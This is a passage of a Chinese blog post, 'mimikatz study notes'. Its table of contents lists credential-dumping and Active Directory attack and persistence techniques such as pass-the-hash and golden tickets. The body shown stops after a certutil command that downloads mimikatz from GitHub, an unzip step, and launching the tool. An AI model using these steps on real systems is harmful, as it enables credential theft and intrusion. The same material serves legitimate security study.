<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 7.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/assets/images/favicon-package/apple-touch-icon.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/assets/images/favicon-package/favicon-32x32.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/assets/images/favicon-package/favicon-16x16.png">
  <link rel="mask-icon" href="/assets/images/favicon-package/safari-pinned-tab.svg" color="#222">
  <link rel="manifest" href="/assets/images/favicon-package/site.webmanifest">
  <meta name="google-site-verification" content="qIz-Tg08U6gyN_53z89yii0ZmKx2avfsO-iyOWhsRx8">
  <meta name="msvalidate.01" content="096F3D01D2AA04148F10750CD4566535">
  <meta name="yandex-verification" content="43f790b7e38394a4">
  <meta name="baidu-site-verification" content="codeva-LMZoUaXjJl">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="/lib/@fortawesome/fontawesome-free/css/all.min.css" integrity="sha256-dABdfBfUoC8vJUBOwGVdm8L9qlMWaHTIfXt+7GnZCIo=" crossorigin="anonymous">
  <link rel="stylesheet" href="/lib/animate.css/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"loli.fj.cn","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.23.2","exturl":false,"sidebar":{"position":"right","width_expanded":320,"width_dual_column":240,"display":"always","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"atom-one-light","dark":"atom-one-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":"mac"},"fold":{"enable":true,"height":500},"language":true},"bookmark":{"enable":true,"color":"#222","save":"manual"},"mediumzoom":true,"lazyload":false,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":true}}</script><script src="/js/config.js" defer></script>

    <meta name="description" content="前言mimikatz学习笔记">
<meta property="og:type" content="article">
<meta property="og:title" content="【笔记】mimikatz学习笔记">
<meta property="og:url" content="https://loli.fj.cn/2024/11/14/mimikatz%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/index.html">
<meta property="og:site_name" content="57uv6Z6g55qE5Y2a5a6i">
<meta property="og:description" content="前言mimikatz学习笔记">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2024-11-14T03:23:48.000Z">
<meta property="article:modified_time" content="2025-10-25T07:39:44.943Z">
<meta property="article:author" content="57uv6Z6g">
<meta property="article:tag" content="Windows">
<meta property="article:tag" content="Github">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="https://loli.fj.cn/2024/11/14/mimikatz%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">


<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://loli.fj.cn/2024/11/14/mimikatz%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","path":"2024/11/14/mimikatz学习笔记/","title":"【笔记】mimikatz学习笔记"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>【笔记】mimikatz学习笔记 | 57uv6Z6g55qE5Y2a5a6i</title>
  






  <script async defer data-website-id="981ed5a0-eea5-4426-a8a9-c16a789ccc3f" src="https://umami.loli.fj.cn/script.js" data-host-url="https://umami.loli.fj.cn/"></script>


  
  <script src="/lib/animejs/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
  <script src="/lib/@next-theme/pjax/pjax.min.js" integrity="sha256-vxLn1tSKWD4dqbMRyv940UYw4sXgMtYcK6reefzZrao=" crossorigin="anonymous" defer></script>
  <script src="/lib/medium-zoom/dist/medium-zoom.min.js" integrity="sha256-ZgMyDAIYDYGxbcpJcfUnYwNevG/xi9OHKaR/8GK+jWc=" crossorigin="anonymous" defer></script>
  <script src="/lib/pangu/dist/browser/pangu.umd.js" integrity="sha256-erngBMP3zzoIM6eqQ8dmrReh2vqCRgWmORroIfVoDlE=" crossorigin="anonymous" defer></script>
<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script><script src="/js/bookmark.js" defer></script><script src="/js/pjax.js" defer></script>

  <script src="/lib/hexo-generator-searchdb/dist/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
<script src="/js/third-party/search/local-search.js" defer></script>







  
  <script data-pjax async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>




  

  <script class="next-config" data-name="enableMath" type="application/json">false</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"none","js":{"url":"/lib/mathjax/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
<script src="/js/third-party/math/mathjax.js" defer></script>



  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
<link rel="alternate" href="/atom.xml" title="57uv6Z6g55qE5Y2a5a6i" type="application/atom+xml">
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">57uv6Z6g55qE5Y2a5a6i</p>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">MS4wLjABAAAA5qMD8Gzdcgq7HXUOviKB59i0-ybJ59jJvNzyaPt5XOsVNqP6DU7WLcoAXvdxvYdp💗<br><font color="red">本站所有文章仅作技术研究，请勿非法破坏，请遵守相关法律法规，后果自负</font></p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="搜索" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-links"><a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a></li><li class="menu-item menu-item-reward"><a href="/reward/" rel="section"><i class="fa fa-hand-holding-heart fa-fw"></i>赞助</a></li><li class="menu-item menu-item-command"><a href="/command/" rel="section"><i class="fa fa-book fa-fw"></i>指令</a></li><li class="menu-item menu-item-contribute"><a href="/contribute/" rel="section"><i class="fa fa-chart-line fa-fw"></i>贡献</a></li><li class="menu-item menu-item-rss"><a href="/atom.xml" rel="section"><i class="fa fa-rss fa-fw"></i>订阅</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
      <div class="search-header">
        <span class="search-icon">
          <i class="fa fa-search"></i>
        </span>
        <div class="search-input-container">
          <input autocomplete="off" autocapitalize="off" maxlength="80"
                placeholder="搜索..." spellcheck="false"
                type="search" class="search-input">
        </div>
        <span class="popup-btn-close" role="button">
          <i class="fa fa-times-circle"></i>
        </span>
      </div>
      <div class="search-result-container">
        <div class="search-result-icon">
          <i class="fa fa-spinner fa-pulse fa-5x"></i>
        </div>
      </div>
    </div>
  </div>

<link rel="manifest" href="/assets/images/favicon-package/site.webmanifest">

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%8B%E8%BD%BD%E4%BE%9D%E8%B5%96"><span class="nav-number">2.</span> <span class="nav-text">下载依赖</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%90%AF%E5%8A%A8mimikatz%E6%8E%A7%E5%88%B6%E5%8F%B0"><span class="nav-number">3.</span> <span class="nav-text">启动mimikatz控制台</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Windows-x32"><span class="nav-number">3.1.</span> <span class="nav-text">Windows x32</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Windows-x64"><span class="nav-number">3.2.</span> <span class="nav-text">Windows x64</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%90%AF%E5%8A%A8mimikatz%E6%8E%A7%E5%88%B6%E5%8F%B0%E5%90%8E%E7%AB%8B%E5%8D%B3%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="nav-number">4.</span> <span class="nav-text">启动mimikatz控制台后立即执行命令</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%80%80%E5%87%BAmimikatz%E6%8E%A7%E5%88%B6%E5%8F%B0"><span class="nav-number">5.</span> <span class="nav-text">退出mimikatz控制台</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BE%93%E5%87%BA%E5%88%B0%E6%8E%A7%E5%88%B6%E5%8F%B0"><span class="nav-number">6.</span> <span class="nav-text">输出到控制台</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BE%93%E5%87%BA%E5%88%B0%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6"><span class="nav-number">7.</span> <span class="nav-text">输出到日志文件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8A%93%E5%8F%96%E5%86%85%E5%AD%98%E4%B8%AD%E7%9A%84%E5%AF%86%E7%A0%81"><span class="nav-number">8.</span> <span class="nav-text">抓取内存中的密码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%80%9A%E8%BF%87ProcDump%E5%AF%BC%E5%87%BA%E5%86%85%E5%AD%98%E7%9A%84%E6%95%B0%E6%8D%AE%E5%86%8D%E6%8A%93%E5%8F%96%E5%AF%86%E7%A0%81"><span class="nav-number">9.</span> <span class="nav-text">通过ProcDump导出内存的数据再抓取密码</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%8B%E8%BD%BD%E4%BE%9D%E8%B5%96-1"><span class="nav-number">9.1.</span> <span class="nav-text">下载依赖</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Windows"><span class="nav-number">9.1.1.</span> <span class="nav-text">Windows</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AF%BC%E5%87%BAlsass-exe%E8%BF%9B%E7%A8%8B%E5%AD%98%E5%82%A8%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6"><span class="nav-number">9.2.</span> <span class="nav-text">导出lsass.exe进程存储在内存中的文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BD%BD%E5%85%A5lsass-dmp%E6%96%87%E4%BB%B6%E5%88%B0%E6%94%BB%E5%87%BB%E8%80%85%E7%B3%BB%E7%BB%9F%E5%86%85%E5%AD%98"><span class="nav-number">9.3.</span> <span class="nav-text">载入lsass.dmp文件到攻击者系统内存</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9C%A8%E6%94%BB%E5%87%BB%E8%80%85%E7%B3%BB%E7%BB%9F%E6%8A%93%E5%8F%96%E5%AF%86%E7%A0%81"><span class="nav-number">9.4.</span> <span class="nav-text">在攻击者系统抓取密码</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PTH%EF%BC%88Pass-The-Hash%EF%BC%89"><span class="nav-number">10.</span> <span class="nav-text">PTH（Pass The Hash）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8A%93%E5%8F%96%E5%AF%86%E7%A0%81Hash"><span class="nav-number">10.1.</span> <span class="nav-text">抓取密码Hash</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%91%E9%80%81CMD%E5%91%BD%E4%BB%A4"><span class="nav-number">10.2.</span> <span class="nav-text">发送CMD命令</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PTT%EF%BC%88Pass-The-Ticket%EF%BC%89"><span class="nav-number">11.</span> <span class="nav-text">PTT（Pass The Ticket）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8kekeo%E6%A0%B9%E6%8D%AE%E5%AF%86%E7%A0%81Hash%E7%94%9F%E6%88%90%E5%87%AD%E6%8D%AE%EF%BC%88%E5%8F%AF%E9%80%89%EF%BC%89"><span class="nav-number">11.1.</span> <span class="nav-text">利用kekeo根据密码Hash生成凭据（可选）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AF%BC%E5%87%BA%E5%87%AD%E6%8D%AE"><span class="nav-number">11.2.</span> <span class="nav-text">导出凭据</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AF%BC%E5%85%A5%E5%87%AD%E6%8D%AE"><span class="nav-number">11.3.</span> <span class="nav-text">导入凭据</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BB%BA%E7%AB%8B%E8%BF%9E%E6%8E%A5"><span class="nav-number">11.4.</span> <span class="nav-text">建立连接</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PTK%EF%BC%88Pass-The-Key%EF%BC%89"><span class="nav-number">12.</span> <span class="nav-text">PTK（Pass The Key）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8A%93%E5%8F%96%E5%AF%86%E9%92%A5"><span class="nav-number">12.1.</span> <span class="nav-text">抓取密钥</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%91%E9%80%81CMD%E5%91%BD%E4%BB%A4-1"><span class="nav-number">12.2.</span> <span class="nav-text">发送CMD命令</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Kerberos%E5%87%AD%E6%8D%AE"><span class="nav-number">13.</span> <span class="nav-text">Kerberos凭据</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E5%87%AD%E6%8D%AE"><span class="nav-number">13.1.</span> <span class="nav-text">查看凭据</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AF%BC%E5%87%BA%E5%87%AD%E6%8D%AE-1"><span class="nav-number">13.2.</span> <span class="nav-text">导出凭据</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RDP%E5%87%AD%E6%8D%AE"><span class="nav-number">14.</span> <span class="nav-text">RDP凭据</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E4%BF%9D%E5%AD%98%E7%9A%84%E5%87%AD%E6%8D%AE"><span class="nav-number">14.1.</span> <span class="nav-text">查看保存的凭据</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96credentials%E6%96%87%E4%BB%B6%E5%90%8D"><span class="nav-number">14.2.</span> <span class="nav-text">获取credentials文件名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%9A%E8%BF%87mimikatz%E8%8E%B7%E5%8F%96credentials%E6%96%87%E4%BB%B6%E4%B8%AD%E8%AE%B0%E5%BD%95%E7%9A%84guidMasterKey%E5%80%BC"><span class="nav-number">14.3.</span> <span class="nav-text">通过mimikatz获取credentials文件中记录的guidMasterKey值</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%9A%E8%BF%87mimikatz%E8%8E%B7%E5%8F%96guidMasterKey%E5%AF%B9%E5%BA%94%E7%9A%84MasterKey%E5%80%BC"><span class="nav-number">14.4.</span> <span class="nav-text">通过mimikatz获取guidMasterKey对应的MasterKey值</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%9A%E8%BF%87mimikatz%E8%A7%A3%E5%AF%86MasterKey%E5%80%BC%E5%BE%97%E5%88%B0RDP%E5%AD%98%E5%82%A8%E7%9A%84%E5%AF%86%E7%A0%81"><span class="nav-number">14.5.</span> <span class="nav-text">通过mimikatz解密MasterKey值得到RDP存储的密码</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="nav-number">15.</span> <span class="nav-text">权限维持</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%87%8D%E5%90%AF%E7%B3%BB%E7%BB%9F%E4%B9%8B%E5%89%8D%E8%AE%B0%E5%BD%95%E5%AF%86%E7%A0%81%E5%88%B0%E6%96%87%E4%BB%B6"><span class="nav-number">15.1.</span> <span class="nav-text">重启系统之前记录密码到文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%87%8D%E5%90%AF%E7%B3%BB%E7%BB%9F%E4%B9%8B%E5%90%8E%E8%AE%B0%E5%BD%95%E5%AF%86%E7%A0%81%E5%88%B0%E6%96%87%E4%BB%B6"><span class="nav-number">15.2.</span> <span class="nav-text">重启系统之后记录密码到文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B0%86mimikatz%E4%BD%9C%E4%B8%BA%E5%9F%9F%E6%8E%A7%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81"><span class="nav-number">15.3.</span> <span class="nav-text">将mimikatz作为域控管理员密码</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%BB%BA%E7%AB%8B%E8%BF%9E%E6%8E%A5-1"><span class="nav-number">15.3.1.</span> <span class="nav-text">建立连接</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%99%E4%BA%88%E5%9F%9F%E5%86%85%E7%94%A8%E6%88%B7%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98%E6%9D%83%E9%99%90"><span class="nav-number">15.4.</span> <span class="nav-text">给予域内用户域管理员权限</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8DSRM%E7%9B%AE%E5%BD%95%E6%9C%8D%E5%8A%A1%E6%81%A2%E5%A4%8D%E6%A8%A1%E5%BC%8F"><span class="nav-number">15.5.</span> <span class="nav-text">利用DSRM目录服务恢复模式</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96krbtgt%E7%94%A8%E6%88%B7%E7%9A%84NTLM%E5%93%88%E5%B8%8C%E5%80%BC"><span class="nav-number">15.5.1.</span> <span class="nav-text">获取krbtgt用户的NTLM哈希值</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8BAdministrator%E7%94%A8%E6%88%B7%E7%9A%84NTLM%E5%93%88%E5%B8%8C%E5%80%BC"><span class="nav-number">15.5.2.</span> <span class="nav-text">查看Administrator用户的NTLM哈希值</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BF%AE%E6%94%B9DSRM%E7%9A%84%E5%AF%86%E7%A0%81"><span class="nav-number">15.5.3.</span> <span class="nav-text">修改DSRM的密码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BF%AE%E6%94%B9DSRM%E7%99%BB%E5%BD%95%E6%96%B9%E5%BC%8F"><span class="nav-number">15.5.4.</span> <span class="nav-text">修改DSRM登录方式</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8PTH%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB"><span class="nav-number">15.5.5.</span> <span class="nav-text">利用PTH传递攻击</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%BB%84%E9%87%91%E5%87%AD%E6%8D%AE"><span class="nav-number">15.6.</span> <span class="nav-text">黄金凭据</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E4%BB%BB%E6%84%8F%E5%9F%9F%E5%86%85%E9%9C%80%E8%A6%81%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E7%9A%84%E7%94%A8%E6%88%B7%E7%9A%84SID"><span class="nav-number">15.6.1.</span> <span class="nav-text">获取任意域内需要权限维持的用户的SID</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E6%89%80%E6%9C%89%E7%94%A8%E6%88%B7%E7%9A%84NTLM%E5%93%88%E5%B8%8C%E5%80%BC"><span class="nav-number">15.6.2.</span> <span class="nav-text">获取所有用户的NTLM哈希值</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96krbtgt%E7%94%A8%E6%88%B7%E7%9A%84NTLM%E5%93%88%E5%B8%8C%E5%80%BC-1"><span class="nav-number">15.6.2.1.</span> <span class="nav-text">获取krbtgt用户的NTLM哈希值</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%B6%E4%BD%9C%E9%BB%84%E9%87%91%E5%87%AD%E6%8D%AE"><span class="nav-number">15.6.3.</span> <span class="nav-text">制作黄金凭据</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AF%BC%E5%85%A5%E5%87%AD%E6%8D%AE%E6%96%87%E4%BB%B6%E5%88%B0%E5%86%85%E5%AD%98"><span class="nav-number">15.6.4.</span> <span class="nav-text">导入凭据文件到内存</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%BB%BA%E7%AB%8B%E8%BF%9E%E6%8E%A5-2"><span class="nav-number">15.6.5.</span> <span class="nav-text">建立连接</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%99%BD%E9%93%B6%E5%87%AD%E6%8D%AE"><span class="nav-number">15.7.</span> <span class="nav-text">白银凭据</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E4%BB%BB%E6%84%8F%E5%9F%9F%E5%86%85%E9%9C%80%E8%A6%81%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E7%9A%84%E7%94%A8%E6%88%B7%E7%9A%84SID-1"><span class="nav-number">15.7.1.</span> <span class="nav-text">获取任意域内需要权限维持的用户的SID</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E5%9F%9F%E6%8E%A7%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%90%8D%E5%92%8C%E5%AF%86%E7%A0%81NTLM%E5%93%88%E5%B8%8C%E5%80%BC"><span class="nav-number">15.7.2.</span> <span class="nav-text">获取域控计算机名和密码NTLM哈希值</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%B6%E4%BD%9C%E7%99%BD%E9%93%B6%E5%87%AD%E6%8D%AE"><span class="nav-number">15.7.3.</span> <span class="nav-text">制作白银凭据</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%BB%BA%E7%AB%8B%E8%BF%9E%E6%8E%A5-3"><span class="nav-number">15.7.4.</span> <span class="nav-text">建立连接</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%8C%E6%88%90"><span class="nav-number">16.</span> <span class="nav-text">完成</span></a></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="57uv6Z6g"
      src="/assets/images/avatar.gif">
  <p class="site-author-name" itemprop="name">57uv6Z6g</p>
  <div class="site-description" itemprop="description">5o2V5o2J5LiA5Y+q54ix5oqY6IW+55qE57uv6Z6g</div>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <a href="mailto:00-isomer-cabbies@icloud.com" title="E-Mail → mailto:00-isomer-cabbies@icloud.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://t.me/LittleSweetCookie" title="Telegram → https:&#x2F;&#x2F;t.me&#x2F;LittleSweetCookie" rel="noopener me" target="_blank"><i class="fab fa-telegram fa-fw"></i>Telegram</a>
      </span>
  </div>

<div id="aplayer-app"></div>

        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://loli.fj.cn/2024/11/14/mimikatz%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/assets/images/avatar.gif">
      <meta itemprop="name" content="57uv6Z6g">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="57uv6Z6g55qE5Y2a5a6i">
      <meta itemprop="description" content="5o2V5o2J5LiA5Y+q54ix5oqY6IW+55qE57uv6Z6g">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="【笔记】mimikatz学习笔记 | 57uv6Z6g55qE5Y2a5a6i">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          【笔记】mimikatz学习笔记
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2024-11-14 11:23:48" itemprop="dateCreated datePublished" datetime="2024-11-14T11:23:48+08:00">2024-11-14</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2025-10-25 15:39:44" itemprop="dateModified" datetime="2025-10-25T15:39:44+08:00">2025-10-25</time>
    </span>

  
    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
      <span class="post-meta-item-icon">
        <i class="far fa-eye"></i>
      </span>
      <span class="post-meta-item-text">阅读次数：</span>
      <span id="busuanzi_value_page_pv"></span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>mimikatz学习笔记</p>
<span id="more"></span>

<h2 id="下载依赖"><a href="#下载依赖" class="headerlink" title="下载依赖"></a>下载依赖</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">certutil -urlcache -split -f https://github.com/gentilkiwi/mimikatz/releases/download/<span class="number">2</span>.<span class="number">2</span>.<span class="number">0</span>-<span class="number">20220919</span>/mimikatz_trunk.zip</span><br><span class="line">&quot;C:\Program Files\<span class="number">7</span>-Zip\<span class="number">7</span>z.exe&quot; x mimikatz_trunk.zip -omimikatz</span><br><span class="line"><span class="built_in">cd</span> mimikatz</span><br></pre></td></tr></table></figure>

<h2 id="启动mimikatz控制台"><a href="#启动mimikatz控制台" class="headerlink" title="启动mimikatz控制台"></a>启动mimikatz控制台</h2><h3 id="Windows-x32"><a href="#Windows-x32" class="headerlink" title="Windows x32"></a>Windows x32</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\Win32\mimikatz.exe</span><br></pre></td></tr></table></figure>

